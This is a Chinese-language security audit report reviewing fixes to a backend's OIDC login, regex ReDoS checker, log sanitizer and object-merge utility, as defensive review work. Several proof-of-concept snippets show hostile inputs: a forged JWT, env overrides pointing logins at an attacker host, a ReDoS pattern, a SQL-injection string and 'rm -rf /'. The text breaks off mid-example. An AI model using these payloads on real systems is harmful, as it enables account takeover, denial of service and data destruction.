# Wave 6 元漏洞审计 R11 攻击 Wave 6 修复再审 - 2026-06-06

**审计范围**：AetherGuard 后端 (Sprint 5 · Wave 6 · R11 攻击 Wave 6 P0 修复的"修复之修复")
**审计员**：白盒静态审计（不修改代码、不运行攻击）
**审计时间**：2026-06-06
**审计重点**：Wave 6 修了一批 P0（OIDC / safeRegex / sanitizeString / safeMerge）——审计这 4 个修复组件的**自身边界**

---

## 摘要

- **审计覆盖 5 大类元漏洞**：OIDC 验签边界、safeRegex parser 边角、sanitizeString FP/FN、safeMerge 序列化 side-effect、cross-cutting 组合攻击
- **漏洞总数**：21 处（P0 = 6、P1 = 9、P2 = 6）
- **Top 3 最严重**：
  1. **V11.2 OIDC `email_verified` 未强制 → 跨租户账号接管**（P0）— Wave 6 加了 JWKS 验签和 nonce 一次性消费，但 `resolveUser` 只用 userinfo 的 `profile.email` 查/建账号，**完全没看 `email_verified` 也没看 id_token 的 email**。攻击者拿到一个能签发 `email=victim@corp.com` 的 IdP 凭证（被攻陷的 IdP、misconfigured OIDC tenant、自己注册一个 OIDC app 但 IdP 误把任意 email 塞进 userinfo）就能接管任何已有用户的 session
  2. **V11.20 tool-executor 的 `setTimeout` cooperative timeout 是假的 → 真 ReDoS 必出 DoS**（P0）— safe-regex 的静态检测只是**第一道**防线，但 tool-executor 在 regex 编译**之后**用 `setTimeout(() => timedOut = true, 1000)` 兜底。问题是 `regex.exec()` 是**同步**的，引擎卡住时 event loop 被锁死，setTimeout 回调永远不触发，`timedOut` 永远是 false。safe-regex 一旦有 false negative，整个进程就被锁住
  3. **V11.9 sanitizeString 40-char catch-all 漏掉长 secret 末尾 20 字节**（P0）— `/[A-Za-z0-9/+=]{40}/g` 是非交叠匹配，命中 0-39 后**第 40-59 字节没被处理**。一个 60 字节的 OpenAI/Stripe token 会变成 `abcd...wxyz<剩 20 字节明文>` 直接打到日志里

> Wave 6 修复方向正确（JWKS 验签、4 大 ReDoS 家族覆盖、9 大凭证分类、PP 二次防御），但**每个修复的"接缝处"**留下了真实可利用的次级攻击面。F12/F13/F14/F15 互相组合还能产生新的 attack chain（见 cross-cutting 节）。

---

## 1. OIDC 验签边界 (F12)

### V11.1: JWKS 缓存 5 分钟窗口在 IdP key 轮换 / IdP 失陷时被滥用

- **目标文件**: `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:348-373` (`findJwkByKid`)
- **修复概述** (Wave 6 F12):
  - JWKS 缓存 5 分钟（`JWKS_TTL_MS = 5 * 60 * 1000`）
  - 首次拉取 `/.well-known/jwks.json` 后写入 `this.jwksCache`
  - 后续 `verifyIdToken` 优先查 cache
- **新攻击向量**:
  1. **Key 轮换 race**：IdP 在 T0 时刻轮换 signing key，老 key 在 JWKS 里还保留 1 小时（overlap period），T0+5min 时 cache 刷新拿到新 key set — 这段时间内正常用户的旧 key 签的 token 被拒（DoS / 强制登出）
  2. **更危险：IdP 失陷 + cache 持久化**：如果 IdP 私钥泄露，攻击者用老 key 签 token。在 cache 命中老 public key 的 5 分钟窗口内，attacker token 全部通过验签
  3. **Cache 中毒**：JWKS 走 HTTPS 拉取，但 `findJwkByKid` 没用 `Content-Signature` 或 `Issuer` 字段二次验证响应合法性。如果 `OIDC_ISSUER` 被攻击者控制（env 注入，见 V11.4），cache 就会被灌入攻击者的 public key
  4. **kid 冲突**：JWKS 多个 key 用同一个 kid，`keys.find((k) => k && k.kid === kid)` 返回**第一个**——这意味着 IdP 误配两个 kid 相同的 key 时，验签用的永远是第一个
- **PoC**:
  ```ts
  // 1. IdP 私钥泄露：攻击者用老 key 签 token
  const oldKey = leakedOldPrivateKey;  // 假设 T-1d 泄露
  const token = jwt.sign({ sub: 'attacker', iss: ISSUER, aud: CLIENT_ID, ... }, oldKey, { algorithm: 'RS256', keyid: KID });
  // 2. 后端 cache 里有老 public key（5min TTL 内）
  // 3. oidcAuthService.verifyIdToken(token, state) → valid: true
  // 4. 攻击者获得合法 session
  ```
- **影响**:
  - 真实可利用性：**中**（需要 IdP 失陷或 kid 冲突，是 IdP 运维问题不是代码 bug，但 cache 的 5min TTL 加剧了窗口）
  - 攻击者拿到 session 后能调所有 RBAC 允许的 API，包括 `final_defense.execute` / `deployment.run.approve` / `helper.execute`
- **修复建议**:
  ```ts
  // 1. 强制每次 verifyIdToken 都带 `iat` claim 校验
  if (typeof claims.iat === 'number' && now - claims.iat > 60) return { valid: false, reason: 'token_too_old' };
  // 2. Cache 缩短到 30s，或用 `kid + alg` 做签名指纹验证
  // 3. JWKS 拉取后校验 `iss` 字段在响应里也存在
  if (jwks.iss && jwks.iss !== issuer) return { valid: false, reason: 'jwks_iss_mismatch' };
  // 4. 允许多个 key 共享 kid，验证时尝试所有匹配的 key
  ```

### V11.2: OIDC `email_verified` 未强制 → 跨租户账号接管（P0 · TOP 1）

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:393-420` (`resolveUser`)
  - `X:\repos\Networksafe\backend\src\api\routes\auth.routes.ts:542`（调用方）
- **修复概述** (Wave 6 F12):
  - 修了 id_token 验签 / iss / aud / nonce
  - `resolveUser` 用 `findAuthUserByEmail(profile.email)` 查/建账号
- **新攻击向量**:
  - **关键问题**：`profile` 来自 userinfo endpoint（line 375-391），**没有验签**。IdP 可以随意返回任何 email
  - `VerifiedIdTokenClaims` 里有 `email_verified?: boolean`（line 39），但**整个 codebase 没人读这个字段**
  - 攻击路径：
    1. 攻击者拿到一个能控制 userinfo 响应的 IdP（被攻陷 / misconfigured OIDC tenant / 自建 IdP 后注册到合法 app）
    2. 在 userinfo 里返回 `{"sub": "x", "email": "victim@corp.com", "email_verified": false}`
    3. `fetchUserProfile` 通过，`resolveUser` 找到 victim 的 row，**直接 return 已有用户**
    4. `buildSessionUser(victimRow)` → 用 victim 的 role / permissions / tenantId 构造 session
    5. 攻击者获得 victim 完整权限
  - 注意：这**不是** OIDC 协议问题，是**实现**问题——正确的做法是要求 `email_verified === true` **AND** `id_token.email === profile.email`（防止 userinfo 被偷换）
  - 还**没有**检查 `claims.iss` 是否等于 `profile.iss`（userinfo 可能来自不同 issuer）
- **PoC**:
  ```ts
  // 攻击者控制的 IdP 返回 userinfo:
  // { "sub": "x", "email": "admin@victim.com", "email_verified": false, "iss": "..." }
  // 受害者此前已用 password 注册了 admin@victim.com（role=platform_admin）
  // 攻击者走 OIDC 登录 → resolveUser 找到 admin 的 row → session 注入
  ```
- **影响**:
  - 真实可利用性：**高**——只要 IdP 失陷 / 误配 OIDC tenant，**任何**已有 email 用户都会被接管
  - 影响面：跨租户（如果 admin 账号被接管，整个平台沦陷）
- **修复建议**:
  ```ts
  // 在 resolveUser 之前加 email_verified + email 一致性检查
  async resolveUser(profile: OidcUserProfile, verifiedClaims: VerifiedIdTokenClaims): Promise<...> {
    if (verifiedClaims.email_verified !== true) {
      throw new Error('backend.oidc_email_not_verified');
    }
    if (verifiedClaims.email !== profile.email) {
      throw new Error('backend.oidc_email_mismatch_id_token_vs_userinfo');
    }
    // ... 原有逻辑
  }
  ```
  调用方（auth.routes.ts:542）需要把 `verifiedClaims` 传进来。

### V11.3: `nonceStore` 内存 Map，多进程 / 重启场景下的可用性陷阱

- **目标文件**: `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:91` (`nonceStore: Map<...>`)
- **修复概述** (Wave 6 F12):
  - 一次性 nonce 消费（line 237: `this.nonceStore.delete(state)`）
  - 10 分钟 TTL
- **新攻击向量**:
  - **多进程部署（cluster / pm2 / k8s 多 pod）**：每个 Node 进程有自己独立的 `nonceStore`。攻击者拿到合法的 `state` 后向**每个**进程发 callback——只有一个进程会有 nonce，其他都报 `state_unknown`。这本身是 fail-secure，**没有绕过**
  - **但**：`state` 在 frontend 是写 cookie 里的（见 auth.routes.ts 中间件），**所有进程**都能读——意味着 nonce 必须**全局共享**才能让任意进程的 callback 都成功
  - **真实 bug**：当 backend 是 cluster 模式，frontend 收到的 callback 落到**没有 nonce 的进程**，登录失败 → 30% 用户永远 OIDC 登录不上
  - **重启场景**：容器重启 / OOM kill → 所有 in-flight 的 OIDC 流程 nonce 丢失 → 用户看到 `state_unknown` 错误
  - **攻击者利用**：攻击者触发 backend 重启（DoS、k8s liveness 探针失败等），配合**预先抓到的合法 state**（CSRF 攻击早期抓的），能让某些用户的 OIDC 登录半残
- **PoC**:
  ```ts
  // 假设 backend 是 cluster 4 进程
  // 1. 用户点 "Login with OIDC" → frontend 拿到 state=abc
  // 2. backend 进程 1 处理 /api/auth/oidc/start，nonce 入进程 1 的 store
  // 3. IdP callback 落到进程 3（LB 没 sticky）
  // 4. 进程 3 nonceStore 没有 abc → state_unknown
  // 5. 用户被踢回 /login?oidc=failed
  ```
- **影响**:
  - 安全上：fail-secure（**没有**绕过）
  - 可用性：**中**（cluster 部署必出）
- **修复建议**:
  ```ts
  // 把 nonce store 移到 Redis（项目已有 redisService，OIDC_TOKEN_ENDPOINT 之外的 state 不需要强一致）
  // Key: `oidc:nonce:${state}`，TTL 600s
  // value: { nonce, expiresAt }
  // 用 SET NX EX 保证一次性
  ```

### V11.4: OIDC 配置 env 在 `verifyIdToken` 调用时才读，运行时被改能改 issuer

- **目标文件**: `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:80-88`（`env` 函数）以及各调用点
- **修复概述** (Wave 6 F12):
  - `OIDC_ISSUER` / `OIDC_CLIENT_ID` 等都用 `env()` 包装，每次调用时读 `process.env`
- **新攻击向量**:
  - 进程启动后 `OIDC_ISSUER` 被运行时改写（虽然很罕见，但 Node.js 的 `process.env` 在运行时是可写的）
  - 攻击场景：Node.js 的 `process.env` 可以通过 `require('process').env.X = ...` 改写（如果拿到 `require` 的攻击者）
  - **结合 V11.1**：cache 的 `issuer` 字段会和新的 `env('OIDC_ISSUER')` 不匹配，cache 被刷新，attacker 控制的 IdP 的 JWKS 被加载
  - **结合 V11.2**：attacker 让 `OIDC_ISSUER` 指向自己控制的 IdP，userinfo 返回 `victim@corp.com` 但 email_verified=false → 漏洞链 1 完成
  - 还**没有**对 `OIDC_ISSUER` 做"启动期 freeze"或"启动期 + 调用期一致性"校验
- **PoC**:
  ```ts
  // 假设攻击者拿到 backend 的 RCE（任意代码执行）
  process.env.OIDC_ISSUER = 'https://attacker-idp.example';
  process.env.OIDC_AUTHORIZATION_ENDPOINT = 'https://attacker-idp.example/auth';
  process.env.OIDC_TOKEN_ENDPOINT = 'https://attacker-idp.example/token';
  process.env.OIDC_USERINFO_ENDPOINT = 'https://attacker-idp.example/userinfo';
  // 现在所有 OIDC 登录走 attacker IdP
  ```
- **影响**:
  - 真实可利用性：**低**（需要 RCE 已经成立，但 RCE 后这是顺水推舟）
  - 配合 V11.2 漏洞链可造成持久账号接管
- **修复建议**:
  ```ts
  // 在 OidcAuthService 构造时 freeze 一份配置快照
  private readonly config = Object.freeze({
    issuer: env('OIDC_ISSUER'),
    clientId: env('OIDC_CLIENT_ID'),
    // ...
  });
  // 每次 verifyIdToken 用 this.config.issuer 而不是重新 env()
  ```

---

## 2. safeRegex parser 边角 (F13)

### V11.5: `getQuantifierEnd` 不识别 `?` → `(...)?` + 内部 quantifier 的 lazy 路径未触发检测

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:87-104`
- **修复概述** (Wave 6 F13):
  - `getQuantifierEnd` 识别 `+` / `*` / `{n,m}` 三种 quantifier
  - **没有** `?`（零或一次 / lazy 标记）
- **新攻击向量**:
  - `((a+)+?)b` —— 内部 `(a+)` 是 nested quantifier，外部 `)?` 让整个组变成 lazy + optional
  - 当前代码：`getQuantifierEnd` 看到 `)` 后面是 `?`，返回 `closeIdx + 1`，`isQuantified = false`
  - **trace 一下**：
    - scanForNestedQuantifier 看到 `(`，findMatchingParen 返回 9（最右 `)`）
    - content = `(a+)+?b`
    - getQuantifierEnd at 9 → 10（`?` 不是 quantifier）
    - isQuantified = false → 不会触发 `isQuantified && contentHasDanger`
    - **不会** recurse 进 content（因为 `if (scanForNestedQuantifier(content, 0, content.length)) return true;` 在 isQuantified 之前——让我重读代码）
  - 重读代码：scanForNestedQuantifier 是先检查 isQuantified + contentHasDanger，再 recurse content。所以 `((a+)+?)b` 不会被外层 scanForNestedQuantifier 检测
  - **实际**：`((a+)+?)b` 不是 catastrophic（`?` 是 lazy，整组只匹配一次），所以是 false alarm。但 `((a+)+?)*` 模式会绕过检测：
    - 实际输入：pattern = `((a+)+?)*`，scanForNestedQuantifier:
      - i=0, `(`, findMatchingParen → 7 (the `)` before `)*`)
      - content = `(a+)+?`
      - getQuantifierEnd at 7 → 8 (the `*`!) → returns 9
      - isQuantified = TRUE
      - contentHasDanger on `(a+)+?`: sees `(`, recurses, finds `+` → returns true
      - **detected**
  - 所以**这个不是 real bug**。但有一个真实问题：`?` 在外层会让 `(...)?` 被识别为非 quantified，下游 `getQuantifierEnd` 调用方可能误判。记录为 P2
- **影响**:
  - 真实可利用性：**极低**（`?` 不引入指数回溯）
- **修复建议**:
  - 文档化"我们故意不识别 `?`"，或在 `getQuantifierEnd` 中加一行：`if (i < pattern.length && pattern[i] === '?') return i + 1;`

### V11.6: HEAVY_BACKREFERENCE 漏掉 `(.+)\1+`（无 `{n,m}` 边界的 backreference）

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:192` (`HEAVY_BACKREFERENCE`)
- **修复概述** (Wave 6 F13):
  - `HEAVY_BACKREFERENCE = /\(\.\+\)\\\d+\{\d+,?\d*\}/` 只匹配 `(.+)\\<n>{m[,k]}` 形式
- **新攻击向量**:
  - 模式 `(.+)\1+`（无 `{n,m}`）—— 引擎对每次 `\1+` 都要重新匹配捕获组，O(n²)
  - 模式 `(.+)\1*` 同样
  - 模式 `(\w+)\1+` 同样（HEAVY_BACKREFERENCE 要求字面量 `(.+)`，不接受 `\w+`）
  - **trace**：`(.+)\1+`
    - scanForNestedQuantifier：i=0, `(`, findMatchingParen → 3, content=`.+`, getQuantifierEnd at 3: char 4 is `\` → not quantifier, return 4, isQuantified = false
    - 不会触发 `isQuantified && contentHasDanger`
    - 不会 recurse 进 content（`scanForNestedQuantifier` 在 isQuantified=false 时不 recurse，看代码 line 168-170）
    - HEAVY_BACKREFERENCE: `(.+)\1+` — needs `{m[,k]}` — **不匹配**
    - **通过验证！**
  - 实际 ReDoS：`(.+)\1+` 在 "aaaaaa....aaaa"（很多 a）上做 `\1+` 重复匹配时，引擎要从 capture group 重新匹配每个位置，O(n²)
- **PoC**:
  ```ts
  const re = /(.+)\1+/;
  re.test('a'.repeat(100000));  // O(n²)，单次匹配可能数秒
  ```
- **影响**:
  - 真实可利用性：**中**（O(n²) 不是指数，但 100k 字符就能 lock event loop 数秒，DoS 成立）
  - 配合 V11.20 的 fake timeout，**完全无防御**
- **修复建议**:
  ```ts
  // 1. 扩 HEAVY_BACKREFERENCE 接受无界 quantifier
  const HEAVY_BACKREFERENCE = /\(\.\+\)\\\d+[+*]/;  // \1+, \1*
  // 2. 接受 \w+ 等其他字符类
  const HEAVY_BACKREFERENCE = /\((?:.+|\w+|\S+)\)\\\d+([+*]|\{\d+,?\d*\})/;
  // 3. 通用：在 contentHasDanger 里也标记 backreference 出现为 danger
  ```

### V11.7: `findCharClassEnd` 不处理 char class 内的 `[` 嵌套（intersection `&&`）

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:50-63`
- **修复概述** (Wave 6 F13):
  - 单层 char class 解析，跳过 `\`
  - **不**跟踪嵌套的 `[`（如 `[a-z&&[^aeiou]]` 中的内层 `[`）
- **新攻击向量**:
  - 模式 `[a-z&&[^aeiou]]+x` —— 内层 `[` 让 findCharClassEnd 提早返回（找到第一个 `]`）
  - **trace**：`[a-z&&[^aeiou]]`
    - i=1 (`a`), 2 (`-`), 3 (`z`), 4 (`&`), 5 (`&`), 6 (`[`) — 不识别为嵌套，继续走
    - 7 (`^`), 8 (`a`), 9 (`e`), 10 (`i`), 11 (`o`), 12 (`u`), 13 (`]`) → return 13
  - 实际 class 结束在 14（外层 `]`）。但**这个错误对 ReDoS 检测无影响**：
    - 在 findMatchingParen 里调用，class 内的 `(` 通常是字面字符（JS regex 中 `(` 在 char class 内不是 group opener）
    - 提前返回 13 意味着扫描器在 14 看到 `]`，这是字面字符，继续走
  - **真正的问题**：在 `[a-z[0-9]]`（V8 引擎支持的 char class 嵌套）模式中，提前返回让 `]` 后的内容被错误解析
  - 实际可利用的 ReDoS 路径：`[[a-z]&&[^abc]]+(.*)+$` —— 这种 intersection + 嵌套 + outer quantifier + inner quantified group 的模式**已经**会被 contentHasDanger 抓到（因为内层 `(.+)`）。**不是 ReDoS bypass**
- **影响**:
  - 真实可利用性：**极低**（不影响 ReDoS 检测的完备性）
- **修复建议**:
  - 跟踪 `[` 深度：`if (ch === '[' && !escaped) bracketDepth += 1; if (ch === ']' && !escaped) { bracketDepth -= 1; if (bracketDepth === 0) return i; }`

### V11.8: `findMatchingParen` 不识别 `(?#comment)` —— JS 合法但被错认为 group

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:65-85`
- **修复概述** (Wave 6 F13):
  - 单层 paren 计数
  - **不**识别 `(?:...)` 形式（passive group） / `(?=...)`（lookahead）/ `(?#...)`（comment）等的语义
- **新攻击向量**:
  - 模式 `(?#)(a+)+b` —— `(?#)` 是空注释，JS 引擎**会丢掉**。但 validator 看到 `(?#)` 是个 group：
    - findMatchingParen: 看到 `(` depth 1, `?` skip, `#` skip, `)` depth 0 → return 3
    - content = `?#`, contentHasDanger: 无 quantifier
    - i=4, `(`, 正常处理 inner group → detected
  - **没绕过**
  - 真正问题：模式 `(?#a+b)(.*)+c` —— validator 看到 `(?#a+b)` 是个 group with quantifier inside:
    - findMatchingParen: 找到第 6 个 `)` (在 `c` 前面)
    - content = `?#a+b`
    - contentHasDanger: `+` at index 3 → returns true
    - isQuantified = false (`c` not quantifier)
    - 所以**不会** return true
  - 实际上这个模式在 JS 里就是 `(.*)+c`（注释被丢弃），而 `(.*)+c` 是经典 ReDoS → **被 recurse 抓到了**（`if (scanForNestedQuantifier(content, 0, content.length)) return true;` —— 我看代码 line 170：recursion 只在 isQuantified=true 时发生……）
  - 让我重读：scanForNestedQuantifier:
    ```ts
    if (isQuantified && contentHasDanger(content)) return true;
    if (scanForNestedQuantifier(content, 0, content.length)) return true;  // ← 这里
    ```
  - 实际：line 170 的 recurse **总是**发生（无论 isQuantified）。所以 content `(.*)+c` 被 recurse → scanForNestedQuantifier(content) → 抓到 `(.*)+` 的 nested quantifier
  - **detected**。OK
- **影响**:
  - 真实可利用性：**无**（recursion 兜住了）
- **修复建议**:
  - 文档化"不识别 `(?#comment)`，依赖 recursion 兜底"，或显式跳过 `(?#...)` 块

---

## 3. sanitizeString FP / FN (F14)

### V11.9: 40-char catch-all 只截前 40 字节，长 secret 末尾泄漏 20+ 字节（P0 · TOP 3）

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:71` (`/[A-Za-z0-9/+=]{40}/g`)
- **修复概述** (Wave 6 F14):
  - 在所有具体前缀（GitHub/OpenAI/Stripe/Discord/Telegram/PEM）的 catch-all 之后加 `/[A-Za-z0-9/+=]{40}/g` 作为 AWS Secret Key fallback
- **新攻击向量**:
  - **关键问题**：这个 regex 命中非交叠区间，**匹配后不重匹配前缀已被替换的位置**
  - 60 字节 secret `AAAA...AAAA`（40个A）+ `BBBB...BBBB`（20个B）：
    - regex 命中 0-39 → 替换为 `aaaa...aaaa`（partial reveal）
    - 替换后字符串变成 `aaaa...aaaabbbb...bbbb`（~32 字节）
    - regex 从位置 12 开始找下一个 40-char match —— 找不到（只剩 ~20 字节 b）
    - 结果：`aaaa...aaaaBBBBBBBBBBBBBBBBBBBB`（20 字节 B **明文**残留）
  - 同理：100 字节 secret 命中 0-39 + 80-119（因为替换后位置 12 继续找）—— 60-79 区间**会被覆盖**，但**位置 40-59 永远漏掉**
  - 实际可利用场景：
    - 长 JWT（> 40 chars）—— 部分命中，部分泄漏
    - 长 base64 private key
    - 长 random token
  - **更阴险**：如果 secret 是 `<prefix>AAAA...AAAABBBB...BBBB`（前缀 + 40 base64 + 20 base64），prefix 没被前面任何一个 regex 抓到，40-char regex 抓前 40 base64 → 末尾 20 base64 仍可见
- **PoC**:
  ```ts
  const secret = 'sk-' + 'A'.repeat(40) + 'B'.repeat(20);  // 63 字节，模拟长 OpenAI key
  // sanitizeString(secret):
  // 1. AKIA / sk- / 等具体 regex 不匹配（没 AKIA 前缀）
  // 2. /[A-Za-z0-9/+=]{40}/g 匹配 0-39 (sk-AAAA...AAAA) → 替换为 sk-...AAAA
  // 3. 剩余 "BBBBBBBBBBBBBBBBBBBB" (20字节) 仍明文
  ```
- **影响**:
  - 真实可利用性：**高**（任何长度 > 40 的 base64-like secret 都会部分泄漏）
  - 配合 operator log 阅读，attacker 拿到 20 字节可暴力续猜
- **修复建议**:
  ```ts
  // 方案 A: 用 look-ahead 一次匹配到底
  /(?=[A-Za-z0-9/+=]{40,})[A-Za-z0-9/+=]{40,}/g  // 一次匹配 40+
  // 方案 B: 在 40-char 匹配后，递归检查匹配区间之后的下一个 40 区间
  // 方案 C: 用更激进的策略：所有超过 N 字节的连续 base64-like 字符都视为 secret
  /[A-Za-z0-9/+=]{20,}/g  // 降低阈值到 20，覆盖长 secret 的中后段
  ```

### V11.10: AWS signed URL 正则不匹配真实签名 URL —— 完全 FN

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:39`
- **修复概述** (Wave 6 F14):
  - 新增 `/\/\/[A-Za-z0-9+\/=]{32,}\.amazonaws\.com/g` 注释为 "AWS signed URL"
- **新攻击向量**:
  - **真实 S3 signed URL** 形式：`https://bucket.s3.amazonaws.com/path?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...&X-Amz-Signature=<base64>`
  - 签名 `X-Amz-Signature` 在 **query string**，不在 host
  - 当前 regex 只看 host 部分，要求 host 是 32+ base64 chars 结尾是 `.amazonaws.com`
  - **实际**：
    - bucket 名通常不是 32+ base64（如 `my-bucket-prod`，15 字节）
    - 签名在 `?X-Amz-Signature=...` query 里
    - 当前 regex **100% miss** 所有真实 S3 signed URL
  - FN 后果：S3 presigned URL 泄漏到日志（包含 X-Amz-Signature，可直接拿临时凭证访问对象）
- **PoC**:
  ```ts
  const signedUrl = 'https://my-bucket.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Signature=abcd1234...';
  sanitizeString(signedUrl);
  // 1. /\\/\\/[A-Za-z0-9+\/=]{32,}\\.amazonaws\\.com/ 不匹配（host 太短）
  // 2. 后续 regex 都不抓 query string
  // 3. 整个 URL 明文泄漏，包括 X-Amz-Signature
  ```
- **影响**:
  - 真实可利用性：**高**（S3 presigned URL 拿到的凭证能下载/上传对象）
  - 配合审计日志输出 → attacker 通过 log 注入拿到对象访问权
- **修复建议**:
  ```ts
  // 1. 抓 X-Amz-Signature query param
  /X-Amz-Signature=[A-Za-z0-9%+/=]{16,}/g
  // 2. 抓 AWS4-HMAC-SHA256 credential
  /X-Amz-Credential=[^&]+/g
  // 3. 抓 SigV4 (Amazon CloudFront / RDS / etc.) — 类似 query param
  ```

### V11.11: Partial reveal 泄漏 secret 首末各 4 字节

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:165-177`
- **修复概述** (Wave 6 F14):
  - 对长度 > 20 的匹配，返回 `${first4}...${last4}`
  - 长度 ≤ 20 的匹配，返回 `***REDACTED***`
- **新攻击向量**:
  - 攻击者读日志可以**确认凭证类型**（如 `ghp_...wxyz` 必是 GitHub PAT，`sk-1...90AB` 必是 OpenAI key）
  - 还能拿到 8 字节 secret 明文（prefix 4 + suffix 4）
  - **对短 token（≤ 20）保护 OK**（完全 redact），**对长 token 留 8 字节**
  - 配合 V11.9：如果长 secret 只命中前 40 字节，partial reveal 的 first-4 是明文 4 字节（**已泄漏**）；last-4 也是明文 4 字节
- **PoC**:
  ```ts
  const ghp = 'ghp_' + 'A'.repeat(40);  // 44 字节 GitHub PAT
  sanitizeString(`Logged: ${ghp}`);
  // → "Logged: ghp_...AAAA"（A 是明文 4 字节）
  ```
- **影响**:
  - 真实可利用性：**中**（8 字节不足以暴力 32+ 字节 key，但泄漏凭证类型 = 业务情报）
- **修复建议**:
  ```ts
  // 1. 改成完全 redact（不暴露 first-4 / last-4）
  return '***REDACTED***';
  // 2. 如果要保留可读性，用 HMAC 替代 partial reveal
  const { createHmac } = require('crypto');
  const hmac = createHmac('sha256', process.env.LOG_HASH_SALT).update(match).digest('hex').slice(0, 8);
  return `***${hmac}***`;
  ```

### V11.12: `REDACT_FIELDS` 用 substring 匹配 → 误报 + 漏报并存

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:89-108, 134-136`
- **修复概述** (Wave 6 F14):
  - `REDACT_FIELDS` 是 18 个关键字（password, secret, token, csrf, ssn, ...）
  - `sanitizeObject` 用 `lowerKey.includes(sensitive.toLowerCase())` 判断
- **新攻击向量**:
  - **False positive（误报）**：
    - `passwordless: 'user@example.com'` — 含 "password" substring → redacted
    - `usertoken: 'visible-data'` — 含 "token" → redacted
    - `tokendata: 'config-value'` → redacted
    - `apiKey_user: 'partner-app-id'` — 含 "apikey" → partially redacted
    - `cvv_required: false` → redacted（"cvv_required" 含 "cvv"）
  - **False negative（漏报）**：
    - `cookie: 'session-id-value'` — "cookie" 不在 REDACT_FIELDS → **完全明文**
    - `sessionId: '...'` — 不在
    - `xsrf: '...'` — "xsrf" 不在（只有 "csrf"）
    - `connectionString: 'Server=...;Password=...'` — "connectionstring" 不在
    - `privateKey: '...'` — 不在
  - **危害**：cookie / session token 直接进日志是**信息泄漏** P0
- **PoC**:
  ```ts
  sanitizeObject({ passwordless: 'real@email.com', cookie: 'session=abc123' });
  // → { passwordless: '***REDACTED***', cookie: 'session=abc123' }
  // cookie session 完全可见
  ```
- **影响**:
  - 真实可利用性：**高**（cookie / session token 泄漏 = session 接管）
  - Operator log 包含 `req.headers.cookie` 的话更糟糕（见 `Sanitizers.request` line 254-266，已经过滤了 authorization header，但没过滤 cookie header）
- **修复建议**:
  ```ts
  const REDACT_FIELDS = [
    // ... 现有 18 个 ...
    'cookie', 'sessionid', 'session_id', 'xsrf', 'privatekey',
    'connectionstring', 'connection_string', 'database_url',
    'mysql_url', 'pg_url', 'redis_url',
  ];
  // 改用 word-boundary regex
  const isSensitive = REDACT_FIELDS.some(sensitive =>
    new RegExp(`(?:^|[^a-z])${escapeRegex(sensitive)}(?:$|[^a-z])`, 'i').test(key)
  );
  ```

### V11.13: `sanitizeObject` 默认 `maxDepth = 10`，深嵌套 secret 漏脱敏

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:113`
- **修复概述** (Wave 6 F14):
  - `sanitizeObject(obj, maxDepth: number = 10)`
  - 递归到 maxDepth 后停止
- **新攻击向量**:
  - 深度 11+ 的对象内字段不会被脱敏
  - 调用方几乎全部用默认 maxDepth（`sanitize(input)` 在 line 201 → `sanitizeObject(input)` 不传 maxDepth → 用 10）
  - **典型场景**：scanner 上报的 evidence 嵌套 15 层，depth=11 处的 password 不被脱敏
- **PoC**:
  ```ts
  const deep = { a: { b: { c: { d: { e: { f: { g: { h: { i: { j: { k: { password: 'leaked' } } } } } } } } } } } };
  sanitizeObject(deep);
  // depth=11 处的 password 仍是明文 'leaked'
  ```
- **影响**:
  - 真实可利用性：**低**（大多数对象不深；但 scanner evidence 可能深）
- **修复建议**:
  ```ts
  // 1. 取消 maxDepth 限制（递归到原型链终点）
  // 2. 或加个 default = Number.MAX_SAFE_INTEGER
  // 3. 加一个循环检测（防循环引用）
  ```

---

## 4. safeMerge 序列化 side-effect (F15)

### V11.14: `JSON.parse(JSON.stringify(value))` 触发 attacker-controlled `toJSON`（P0 · TOP 2 候选）

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:159`（array 分支）
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:190`（special object 分支）
- **修复概述** (Wave 6 F15):
  - Function → 跳过（line 151）
  - Date / RegExp / Map / Set / Error / Promise / Buffer / typed array → `JSON.parse(JSON.stringify(value))` 序列化
  - comment 说"非序列化值 dropped"
- **新攻击向量**:
  - **关键问题**：`JSON.stringify` 触发**任何**有 `toJSON` 方法的对象——包括 attacker 提供的 class instance
  - 攻击者能控制 `toJSON` 的返回值，所以能控制 merged result 在该 key 上的最终值
  - **如果下游消费者信任 merge result 的结构**（如把它写 DB、当 response 返回），attacker 注入任意数据
  - **典型攻击**：
    ```ts
    class EvilMetadata {
      toJSON() { return { evil: true, sql: "'; DROP TABLE users; --" }; }
    }
    safeMerge(target, { metadata: new EvilMetadata() });
    // metadata 现在是 { evil: true, sql: "'; DROP TABLE users; --" }
    ```
  - **当前调用点**：
    - `security-operations.service.ts:424` — `safeMerge({...existingMetadata}, stripProtoKeys(input.metadata))` —— 来自 ingestion API 的 user input
    - `security-operations.service.ts:573,577` — evidence / remediation 合并
    - `scanner-task.service.ts:1636, 1868` — scanner 上报
    - `devices.routes.ts:724` — codebook entries
  - **DB 持久化路径**：`nextMetadata` → `JSON.stringify(nextMetadata)` → `metadata_json` 列存到 sqlite/postgres
  - 如果 `EvilMetadata.toJSON` 返回的对象是纯数据，DB 写入是 parameterised（**不** SQL 注入），但**反序列化**该 JSON 后是 attacker 控制的 plain object
- **PoC**:
  ```ts
  // scanner agent 被攻陷，上报 metadata:
  const maliciousEvidence = {
    remediation: { runScript: 'rm -rf /' },
    evil: {
      toJSON: () => ({
        // 模拟通过 Object.create(null) 也无法阻止的 toJSON
